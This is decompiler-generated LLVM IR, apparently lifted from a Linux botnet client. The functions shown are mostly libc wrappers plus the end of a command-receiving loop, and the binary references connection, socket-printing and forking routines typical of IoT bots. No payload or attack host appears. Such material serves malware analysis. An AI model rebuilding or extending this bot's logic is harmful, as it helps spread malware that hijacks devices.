dec_label_pc_804dcdd:                             ; preds = %dec_label_pc_804dcdd.outer34, %dec_label_pc_804d905
  %v0_804dce9 = phi i32 [ %v1_804d918, %dec_label_pc_804d905 ], [ %v0_804dce9.pre, %dec_label_pc_804dcdd.outer34 ]
  %stack_var_-64.3 = phi i32 [ %stack_var_-64.2, %dec_label_pc_804d905 ], [ %stack_var_-64.3.ph36, %dec_label_pc_804dcdd.outer34 ]
  store i32 %v2_804dcdd, i32* %eax.global-to-local, align 4
  %v0_804dce3 = load i32, i32* @global_var_8055420.26, align 32
  store i32 %v0_804dce3, i32* %edx.global-to-local, align 4
  %v5_804dce9 = icmp ult i32 %v0_804dce9, 4
  store i1 %v5_804dce9, i1* %cf.global-to-local, align 1
  %v1_804dcec = add i32 %v0_804dce9, -8
  %v2_804dcec = inttoptr i32 %v1_804dcec to i32*
  store i32 4096, i32* %v2_804dcec, align 4
  %v2_804dcf1 = add i32 %v0_804dce9, -12
  %v3_804dcf1 = inttoptr i32 %v2_804dcf1 to i32*
  store i32 %v2_804dcdd, i32* %v3_804dcf1, align 4
  %v0_804dcf2 = load i32, i32* %edx.global-to-local, align 4
  %v2_804dcf2 = add i32 %v0_804dce9, -16
  %v3_804dcf2 = inttoptr i32 %v2_804dcf2 to i32*
  store i32 %v0_804dcf2, i32* %v3_804dcf2, align 4
  %v0_804dcf3 = call i32 @recvLine()
  store i32 %v0_804dcf3, i32* %eax.global-to-local, align 4
  %v0_804dcf8 = load i32, i32* @esp, align 4
  %v8_804dcfe = icmp ne i32 %v0_804dcf3, -1
  store i1 %v8_804dcfe, i1* %cf.global-to-local, align 1
  %v13_804dcfe = icmp eq i32 %v0_804dcf3, -1
  %v1_804dd02 = icmp eq i1 %v13_804dcfe, false
  br i1 %v1_804dd02, label %dec_label_pc_804d6a1, label %dec_label_pc_804d47a.outer

dec_label_pc_804dd0d:                             ; preds = %dec_label_pc_804d7e3, %dec_label_pc_804d873, %dec_label_pc_804d8b4, %dec_label_pc_804d778
  %v0_804dd18 = phi i32 [ %v0_804d873, %dec_label_pc_804d873 ], [ %v1_804d880, %dec_label_pc_804d8b4 ], [ %v3_804d786, %dec_label_pc_804d778 ], [ 0, %dec_label_pc_804d7e3 ]
  ret i32 %v0_804dd18

; uselistorder directives
  uselistorder i32 %v0_804dcf3, { 0, 2, 3, 1 }
  uselistorder i32 %stack_var_-64.3, { 1, 0 }
  uselistorder i32 %v0_804dce9, { 3, 2, 1, 0 }
  uselistorder i8* %stack_var_-68.2.ph35, { 1, 0 }
  uselistorder i8* %stack_var_-52.1.ph31, { 3, 0, 1, 2 }
  uselistorder i32 %stack_var_-28.1.ph, { 0, 2, 3, 1 }
  uselistorder i32 %v4_804dcd2, { 0, 3, 1, 2, 4 }
  uselistorder i32 %storemerge258, { 3, 2, 0, 1 }
  uselistorder i32 %stack_var_-40.1.lcssa, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_804dc97, { 2, 1, 0 }
  uselistorder i32 %v3_804dc82, { 2, 1, 0, 3 }
  uselistorder i32 %stack_var_-40.0, { 0, 2, 1 }
  uselistorder i32 %v0_804dc78, { 2, 1, 0 }
  uselistorder i32 %v1_804dc48, { 1, 0 }
  uselistorder i32 %v1_804dc19, { 1, 0 }
  uselistorder i32 %v5_804dbf5, { 1, 0 }
  uselistorder i32 %v4_804dbf2, { 2, 1, 0, 3, 4 }
  uselistorder i32 %stack_var_-40.178, { 0, 5, 4, 2, 3, 1 }
  uselistorder i8* %v3_804dbfe, { 2, 0, 1 }
  uselistorder i32 %v1_804dbe1, { 1, 0 }
  uselistorder i32 %v0_804dbaa, { 0, 2, 1 }
  uselistorder i32 %storemerge27.in.in, { 3, 2, 1, 0 }
  uselistorder i32 %v0_804db67, { 1, 2, 3, 0 }
  uselistorder i32 %v0_804db49, { 1, 2, 3, 0 }
  uselistorder i32 %v0_804db2d, { 0, 1, 4, 5, 3, 2, 6 }
  uselistorder i32 %v0_804db1a, { 1, 2, 0 }
  uselistorder i32 %v0_804daff, { 1, 2, 3, 0 }
  uselistorder i1 %v0_804dac2, { 1, 0 }
  uselistorder i32 %v7_804dac0, { 1, 0 }
  uselistorder i8* %v22_804da5c, { 1, 2, 0 }
  uselistorder i8* %storemerge18, { 1, 0 }
  uselistorder i32 %v5_804da84, { 3, 2, 1, 0 }
  uselistorder i32 %v2_804da75, { 1, 0 }
  uselistorder i32 %storemerge18.in252, { 2, 1, 0 }
  uselistorder i8* %storemerge18253, { 1, 0 }
  uselistorder i32 %v6_804da2f, { 1, 0 }
  uselistorder i32 %v6_804da07, { 1, 0 }
  uselistorder i32 %v6_804d9e2, { 1, 0 }
  uselistorder i32 %v1_804d9f7, { 1, 0, 2, 3, 5, 4 }
  uselistorder i8* %v5_804d9bf, { 5, 0, 3, 1, 2, 4, 6, 8, 7 }
  uselistorder i32 %v1_804d9bc, { 8, 7, 6, 10, 9, 0, 4, 1, 2, 3, 11, 12, 5, 13, 14, 15 }
  uselistorder i32 %v6_804d9b9, { 1, 0 }
  uselistorder i8* %storemerge19.lcssa, { 0, 2, 1 }
  uselistorder i32 %v5_804d96c, { 0, 1, 4, 3, 2 }
  uselistorder i32 %v4_804d92f, { 0, 2, 1 }
  uselistorder i32 %v0_804d8f6, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v4_804d8f1, { 0, 2, 1 }
  uselistorder i32 %v0_804d895, { 1, 2, 0 }
  uselistorder i1 %v0_804d860, { 1, 0 }
  uselistorder i32 %v3_804d829, { 1, 0 }
  uselistorder i32 %v0_804d803, { 1, 2, 0 }
  uselistorder i1 %v0_804d7d0, { 1, 0 }
  uselistorder i32 %v3_804d799, { 1, 0 }
  uselistorder i1 %v0_804d756, { 1, 0 }
  uselistorder i32 %v0_804d6bb, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804d6b5, { 1, 0, 2 }
  uselistorder i32 %storemerge20, { 2, 5, 4, 0, 3, 1 }
  uselistorder i32 %stack_var_-64.2, { 5, 4, 0, 3, 1, 2, 7, 6 }
  uselistorder i32 %v0_804d50a.in, { 0, 3, 2, 1 }
  uselistorder i32 %v0_804d643, { 1, 0, 2 }
  uselistorder i32 %storemerge21, { 1, 3, 0, 2 }
  uselistorder i32 %v2_804d610, { 2, 0, 1 }
  uselistorder i32 %v1_804d5f9, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_804d5c4, { 1, 0 }
  uselistorder i32 %v0_804d569, { 1, 0, 2 }
  uselistorder i32 %storemerge22, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v2_804d538, { 1, 0, 2 }
  uselistorder i32 %.pre, { 0, 2, 1 }
  uselistorder i32 %v2_804d4fb, { 1, 0 }
  uselistorder i8* %storemerge19216, { 1, 2, 0, 5, 3, 4, 6 }
  uselistorder i32 %v5_804d959, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v2_804dae6, { 6, 7, 0, 1, 2, 3, 4, 5, 8, 9, 10, 11, 12, 13 }
  uselistorder i8* %tmp189, { 1, 0, 2 }
  uselistorder i32 %v2_804dcdd, { 15, 16, 0, 1, 6, 5, 7, 8, 2, 10, 9, 11, 12, 13, 14, 3, 4 }
  uselistorder i32 %v2_804d40a, { 1, 0, 2, 3 }
  uselistorder i32 %v4_804d3ca, { 3, 1, 2, 0 }
  uselistorder i32 %v3_804d3a7, { 1, 0 }
  uselistorder i32 %v2_804d385, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %storemerge23264, { 1, 0 }
  uselistorder i32 %v2_804d365, { 1, 0, 2 }
  uselistorder i32 %v2_804d302, { 1, 0, 2 }
  uselistorder i32 %v2_804d2d1, { 0, 1, 2, 4, 3 }
  uselistorder i32* %stack_var_4, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-5408, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i8** %stack_var_-5424, { 1, 0 }
  uselistorder i32 %tmp134, { 1, 2, 0, 3 }
  uselistorder i8** %stack_var_-36, { 4, 2, 1, 3, 0 }
  uselistorder i32* %edx.global-to-local, { 18, 19, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 17, 12, 11, 13, 15, 14, 16, 20, 21, 22, 23, 24 }
  uselistorder i32* %eax.global-to-local, { 107, 108, 2, 0, 1, 145, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 20, 21, 15, 16, 17, 18, 19, 22, 23, 24, 25, 26, 35, 27, 28, 31, 32, 29, 30, 147, 148, 33, 34, 36, 37, 152, 151, 38, 39, 40, 44, 45, 46, 41, 42, 47, 48, 49, 50, 51, 52, 53, 54, 150, 149, 55, 56, 57, 58, 60, 61, 59, 62, 63, 64, 65, 66, 67, 75, 69, 68, 70, 71, 72, 73, 74, 77, 78, 76, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 106, 91, 92, 95, 93, 94, 96, 97, 100, 98, 99, 101, 102, 103, 104, 105, 109, 110, 112, 111, 115, 113, 114, 43, 116, 117, 118, 119, 120, 121, 122, 123, 124, 132, 127, 133, 125, 126, 128, 129, 130, 131, 146, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144 }
  uselistorder i1* %cf.global-to-local, { 83, 84, 3, 2, 1, 4, 5, 12, 6, 7, 8, 9, 10, 11, 39, 13, 14, 15, 20, 21, 16, 17, 18, 19, 22, 23, 24, 25, 26, 115, 29, 27, 28, 116, 30, 31, 114, 32, 33, 35, 36, 34, 38, 40, 41, 42, 117, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 82, 76, 77, 78, 79, 80, 81, 85, 86, 90, 87, 88, 89, 37, 91, 92, 93, 94, 95, 96, 113, 97, 98, 99, 100, 101, 104, 102, 103, 0, 105, 106, 107, 108, 109, 110, 111, 112 }
  uselistorder i32 (i32, i32)* @__GI_strtok, { 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @fdgets, { 6, 5, 0, 4, 1, 3, 2 }
  uselistorder i32 ()* @listFork, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @__GI_toupper, { 3, 2, 1, 0 }
  uselistorder i8 13, { 0, 3, 1, 2 }
  uselistorder i32 (i32, i8*)* @strstr, { 3, 4, 5, 0, 1, 2, 6, 7, 8 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_8052977.27 to i32), { 2, 1, 0 }
  uselistorder i32 ()* @trim, { 1, 0 }
  uselistorder i32 1073741824, { 0, 2, 1 }
  uselistorder i32 (i32, i32)* @sockprintf, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 -24, { 0, 2, 1, 3, 4, 5, 9, 8, 7, 6, 10, 11, 12, 13 }
  uselistorder i32 -20, { 0, 2, 1, 3, 4, 5, 9, 8, 7, 6, 10, 11, 12, 13 }
  uselistorder i32 ()* @sleep, { 1, 0 }
  uselistorder i32 ()* @initConnection, { 1, 0 }
  uselistorder i32* inttoptr (i32 8 to i32*), { 2, 0, 1, 3, 4 }
  uselistorder i32 (i32, i32, i32)* @__libc_waitpid, { 2, 1, 0 }
  uselistorder i32 (i32)* @__libc_fork, { 3, 2, 1, 0 }
  uselistorder i32 (i8*, ...)* @printf, { 1, 0 }
  uselistorder i32* @global_var_8052a65.71, { 1, 0 }
  uselistorder i8** @global_var_8052a6b.72, { 1, 0 }
  uselistorder i32 ()* @getBuild, { 1, 0 }
  uselistorder i32 ()* @getEndianness, { 1, 0 }
  uselistorder i32 ()* @getCoresAmount, { 1, 0 }
  uselistorder i32 (i32)* @init_rand, { 1, 0 }
  uselistorder i32 (i32)* @srand, { 1, 0 }
  uselistorder i32 (i32*)* @__GI_time, { 7, 8, 9, 10, 11, 12, 16, 17, 18, 19, 20, 21, 22, 0, 1, 2, 3, 4, 5, 13, 14, 15, 6 }
  uselistorder i32* inttoptr (i32 12 to i32*), { 6, 0, 1, 2, 3, 5, 4 }
  uselistorder label %dec_label_pc_804dd0d, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_804dcdd.outer30, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_804dcbf, { 1, 0 }
  uselistorder label %dec_label_pc_804dc78, { 1, 0 }
  uselistorder label %dec_label_pc_804dbf2, { 1, 0 }
  uselistorder label %dec_label_pc_804dbc9, { 1, 0 }
  uselistorder label %dec_label_pc_804db93, { 1, 0 }
  uselistorder label %dec_label_pc_804da67, { 1, 0 }
  uselistorder label %dec_label_pc_804da56, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804da4d, { 1, 0 }
  uselistorder label %dec_label_pc_804d9e9, { 1, 0 }
  uselistorder label %dec_label_pc_804d981, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804d978, { 1, 0 }
  uselistorder label %dec_label_pc_804d94d, { 1, 0 }
  uselistorder label %dec_label_pc_804d823, { 1, 0 }
  uselistorder label %dec_label_pc_804d69e, { 1, 0 }
  uselistorder label %dec_label_pc_804d62f, { 1, 0 }
  uselistorder label %dec_label_pc_804d60d, { 1, 0 }
  uselistorder label %dec_label_pc_804d555, { 1, 0 }
  uselistorder label %dec_label_pc_804d52b, { 1, 0 }
  uselistorder label %dec_label_pc_804d483, { 1, 0 }
  uselistorder label %dec_label_pc_804d454, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804d382, { 1, 0 }
}

define i32 @__vfork() local_unnamed_addr {
entry:
  %v0_804dd22 = call i32 @vfork()
  %v5_804dd25 = icmp ult i32 %v0_804dd22, -4095
  %v1_804dd2a = icmp eq i1 %v5_804dd25, false
  call void @__pseudo_cond_branch(i1 %v1_804dd2a, i32 134549752)
  ret i32 %v0_804dd22
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %v0_804dd34 = load i32, i32* @edi, align 4
  %v0_804dd35 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_804dd49 = add i32 %arg2, -12
  %v6_804dd53 = icmp ugt i32 %v1_804dd49, 2
  br i1 %v6_804dd53, label %dec_label_pc_804dd63, label %dec_label_pc_804dd55

dec_label_pc_804dd55:                             ; preds = %entry
  %v4_804dd59 = call i32 @__GI_fcntl64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %v1_804dd49)
  br label %dec_label_pc_804dd85

dec_label_pc_804dd63:                             ; preds = %entry
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_804dd6b = call i32 (i32, i32, ...) @fcntl(i32 %arg1, i32 %arg2)
  store i32 %v2_804dd6b, i32* %ebx.global-to-local, align 4
  %tmp17 = icmp ult i32 %v2_804dd6b, -4095
  br i1 %tmp17, label %dec_label_pc_804dd83, label %dec_label_pc_804dd77

dec_label_pc_804dd77:                             ; preds = %dec_label_pc_804dd63
  %v1_804dd77 = call i32 @__errno_location(i32 %v0_804dd35)
  %v0_804dd7c = load i32, i32* %ebx.global-to-local, align 4
  %v1_804dd7c = sub i32 0, %v0_804dd7c
  %v2_804dd7e = inttoptr i32 %v1_804dd77 to i32*
  store i32 %v1_804dd7c, i32* %v2_804dd7e, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804dd83

dec_label_pc_804dd83:                             ; preds = %dec_label_pc_804dd63, %dec_label_pc_804dd77
  %v0_804dd83 = phi i32 [ %v2_804dd6b, %dec_label_pc_804dd63 ], [ -1, %dec_label_pc_804dd77 ]
  br label %dec_label_pc_804dd85

dec_label_pc_804dd85:                             ; preds = %dec_label_pc_804dd55, %dec_label_pc_804dd83
  %v0_804dd8a = phi i32 [ %v4_804dd59, %dec_label_pc_804dd55 ], [ %v0_804dd83, %dec_label_pc_804dd83 ]
  store i32 %v0_804dd35, i32* @ebx, align 4
  store i32 %v0_804dd34, i32* @edi, align 4
  ret i32 %v0_804dd8a

; uselistorder directives
  uselistorder i32 %v2_804dd6b, { 1, 0, 2 }
  uselistorder i32 %v0_804dd35, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_804dd85, { 1, 0 }
  uselistorder label %dec_label_pc_804dd83, { 1, 0 }
}

define i32 @__GI_fcntl64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804dd8c = load i32, i32* @edi, align 4
  store i32 %v0_804dd8c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804dda4 = load i32, i32* @ebx, align 4
  %v1_804ddac = call i32 @int80_syscall(i32 221)
  store i32 %v1_804ddac, i32* %edi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v1_804ddac, -4095
  br i1 %tmp11, label %dec_label_pc_804ddc4, label %dec_label_pc_804ddb8

dec_label_pc_804ddb8:                             ; preds = %entry
  %v1_804ddb8 = call i32 @__errno_location(i32 %v0_804dda4)
  %v0_804ddbd = load i32, i32* %edi.global-to-local, align 4
  %v1_804ddbd = sub i32 0, %v0_804ddbd
  %v2_804ddbf = inttoptr i32 %v1_804ddb8 to i32*
  store i32 %v1_804ddbd, i32* %v2_804ddbf, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804ddc4

dec_label_pc_804ddc4:                             ; preds = %entry, %dec_label_pc_804ddb8
  %v0_804ddc4 = phi i32 [ %v1_804ddac, %entry ], [ -1, %dec_label_pc_804ddb8 ]
  %v2_804ddc9 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804ddc9, i32* %edi.global-to-local, align 4
  ret i32 %v0_804ddc4

; uselistorder directives
  uselistorder i32 %v1_804ddac, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804ddc4, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @__GI__exit(i32 %arg1) local_unnamed_addr #0 {
entry:
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg1, i32* @ebx, align 4
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @chdir(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804ddf4 = load i32, i32* @edi, align 4
  store i32 %v0_804ddf4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_804ddfc = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804de04 = call i32 @chdir(i32 %v0_804ddfc)
  store i32 %v0_804ddfc, i32* @ebx, align 4
  store i32 %v1_804de04, i32* %edi.global-to-local, align 4
  %tmp8 = icmp ult i32 %v1_804de04, -4095
  br i1 %tmp8, label %dec_label_pc_804de1c, label %dec_label_pc_804de10

dec_label_pc_804de10:                             ; preds = %entry
  %v1_804de10 = call i32 @__errno_location(i32 %v0_804ddfc)
  %v0_804de15 = load i32, i32* %edi.global-to-local, align 4
  %v1_804de15 = sub i32 0, %v0_804de15
  %v2_804de17 = inttoptr i32 %v1_804de10 to i32*
  store i32 %v1_804de15, i32* %v2_804de17, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804de1c

dec_label_pc_804de1c:                             ; preds = %entry, %dec_label_pc_804de10
  %v0_804de1c = phi i32 [ %v1_804de04, %entry ], [ -1, %dec_label_pc_804de10 ]
  %v2_804de1e = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804de1e, i32* @edx, align 4
  %v2_804de20 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804de20, i32* @edi, align 4
  ret i32 %v0_804de1c

; uselistorder directives
  uselistorder i32 %v1_804de04, { 1, 0, 2 }
  uselistorder i32 %v0_804ddfc, { 1, 0, 2 }
  uselistorder i32 (i32)* @chdir, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804de1c, { 1, 0 }
}

define i32 @__libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804de24 = load i32, i32* @edi, align 4
  store i32 %v0_804de24, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804de2c = load i32, i32* @ebx, align 4
  %v1_804de34 = call i32 @close(i32 %arg1)
  store i32 %v0_804de2c, i32* @ebx, align 4
  store i32 %v1_804de34, i32* %edi.global-to-local, align 4
  %tmp8 = icmp ult i32 %v1_804de34, -4095
  br i1 %tmp8, label %dec_label_pc_804de4c, label %dec_label_pc_804de40

dec_label_pc_804de40:                             ; preds = %entry
  %v1_804de40 = call i32 @__errno_location(i32 %v0_804de2c)
  %v0_804de45 = load i32, i32* %edi.global-to-local, align 4
  %v1_804de45 = sub i32 0, %v0_804de45
  %v2_804de47 = inttoptr i32 %v1_804de40 to i32*
  store i32 %v1_804de45, i32* %v2_804de47, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804de4c

dec_label_pc_804de4c:                             ; preds = %entry, %dec_label_pc_804de40
  %v0_804de4c = phi i32 [ %v1_804de34, %entry ], [ -1, %dec_label_pc_804de40 ]
  %v2_804de50 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804de50, i32* @edi, align 4
  ret i32 %v0_804de4c

; uselistorder directives
  uselistorder i32 %v1_804de34, { 1, 0, 2 }
  uselistorder i32 %v0_804de2c, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804de4c, { 1, 0 }
}

define i32 @dup2(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_804de54 = load i32, i32* @ebx, align 4
  store i32 %v0_804de54, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v2_804de67 = call i32 @dup2(i32 %v0_804de54, i32 %tmp4)
  store i32 %v2_804de67, i32* %ebx.global-to-local, align 4
  %tmp8 = icmp ult i32 %v2_804de67, -4095
  br i1 %tmp8, label %dec_label_pc_804de80, label %dec_label_pc_804de74

dec_label_pc_804de74:                             ; preds = %entry
  %v0_804de74 = load i32, i32* %stack_var_-4, align 4
  %v1_804de74 = call i32 @__errno_location(i32 %v0_804de74)
  %v0_804de79 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804de79 = sub i32 0, %v0_804de79
  %v2_804de7b = inttoptr i32 %v1_804de74 to i32*
  store i32 %v1_804de79, i32* %v2_804de7b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804de80

dec_label_pc_804de80:                             ; preds = %entry, %dec_label_pc_804de74
  %v0_804de80 = phi i32 [ %v2_804de67, %entry ], [ -1, %dec_label_pc_804de74 ]
  %v2_804de84 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804de84, i32* @ebx, align 4
  ret i32 %v0_804de80

; uselistorder directives
  uselistorder i32 %v2_804de67, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32, i32)* @dup2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804de80, { 1, 0 }
}

define i32 @__libc_fork(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804de88 = load i32, i32* @ebx, align 4
  store i32 %v0_804de88, i32* %stack_var_-4, align 4
  %v1_804de91 = call i32 @fork(i32 %v0_804de88)
  store i32 %v1_804de91, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_804de91, -4095
  br i1 %tmp6, label %dec_label_pc_804dea8, label %dec_label_pc_804de9c

dec_label_pc_804de9c:                             ; preds = %entry
  %v0_804de9c = load i32, i32* %stack_var_-4, align 4
  %v1_804de9c = call i32 @__errno_location(i32 %v0_804de9c)
  %v0_804dea1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804dea1 = sub i32 0, %v0_804dea1
  %v2_804dea3 = inttoptr i32 %v1_804de9c to i32*
  store i32 %v1_804dea1, i32* %v2_804dea3, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804dea8

dec_label_pc_804dea8:                             ; preds = %entry, %dec_label_pc_804de9c
  %v0_804dea8 = phi i32 [ %v1_804de91, %entry ], [ -1, %dec_label_pc_804de9c ]
  %v2_804deaa = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804deaa, i32* @edx, align 4
  %v2_804deac = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804deac, i32* @ebx, align 4
  ret i32 %v0_804dea8

; uselistorder directives
  uselistorder i32 %v1_804de91, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804dea8, { 1, 0 }
}

define i32 @getdtablesize(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_804deb3 = ptrtoint i32* %stack_var_-8 to i32
  %v2_804deba = call i32 @getrlimit(i32 7, i32 %v2_804deb3)
  store i32 256, i32* @edx, align 4
  %v2_804dec7 = icmp slt i32 %v2_804deba, 0
  br i1 %v2_804dec7, label %dec_label_pc_804decf, label %dec_label_pc_804decb

dec_label_pc_804decb:                             ; preds = %entry
  %v3_804decb = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_804decb, i32* @edx, align 4
  br label %dec_label_pc_804decf

dec_label_pc_804decf:                             ; preds = %entry, %dec_label_pc_804decb
  %v0_804decf = phi i32 [ 256, %entry ], [ %v3_804decb, %dec_label_pc_804decb ]
  ret i32 %v0_804decf

; uselistorder directives
  uselistorder label %dec_label_pc_804decf, { 1, 0 }
}

define i32 @__libc_getpid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804ded8 = load i32, i32* @ebx, align 4
  store i32 %v0_804ded8, i32* %stack_var_-4, align 4
  %v1_804dee1 = call i32 @getpid(i32 %v0_804ded8)
  store i32 %v1_804dee1, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_804dee1, -4095
  br i1 %tmp6, label %dec_label_pc_804def8, label %dec_label_pc_804deec

dec_label_pc_804deec:                             ; preds = %entry
  %v0_804deec = load i32, i32* %stack_var_-4, align 4
  %v1_804deec = call i32 @__errno_location(i32 %v0_804deec)
  %v0_804def1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804def1 = sub i32 0, %v0_804def1
  %v2_804def3 = inttoptr i32 %v1_804deec to i32*
  store i32 %v1_804def1, i32* %v2_804def3, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804def8

dec_label_pc_804def8:                             ; preds = %entry, %dec_label_pc_804deec
  %v0_804def8 = phi i32 [ %v1_804dee1, %entry ], [ -1, %dec_label_pc_804deec ]
  %v2_804defc = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804defc, i32* @ebx, align 4
  ret i32 %v0_804def8

; uselistorder directives
  uselistorder i32 %v1_804dee1, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804def8, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804df00 = load i32, i32* @ebx, align 4
  store i32 %v0_804df00, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_804df13 = call i32 @int80_syscall(i32 191)
  store i32 %v1_804df13, i32* %ebx.global-to-local, align 4
  %tmp8 = icmp ult i32 %v1_804df13, -4095
  br i1 %tmp8, label %dec_label_pc_804df2c, label %dec_label_pc_804df20

dec_label_pc_804df20:                             ; preds = %entry
  %v0_804df20 = load i32, i32* %stack_var_-4, align 4
  %v1_804df20 = call i32 @__errno_location(i32 %v0_804df20)
  %v0_804df25 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804df25 = sub i32 0, %v0_804df25
  %v2_804df27 = inttoptr i32 %v1_804df20 to i32*
  store i32 %v1_804df25, i32* %v2_804df27, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804df2c

dec_label_pc_804df2c:                             ; preds = %entry, %dec_label_pc_804df20
  %v0_804df2c = phi i32 [ %v1_804df13, %entry ], [ -1, %dec_label_pc_804df20 ]
  %v2_804df30 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804df30, i32* @ebx, align 4
  ret i32 %v0_804df2c

; uselistorder directives
  uselistorder i32 %v1_804df13, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804df2c, { 1, 0 }
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_804df34 = load i32, i32* @edi, align 4
  store i32 %v0_804df34, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_804df4c = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
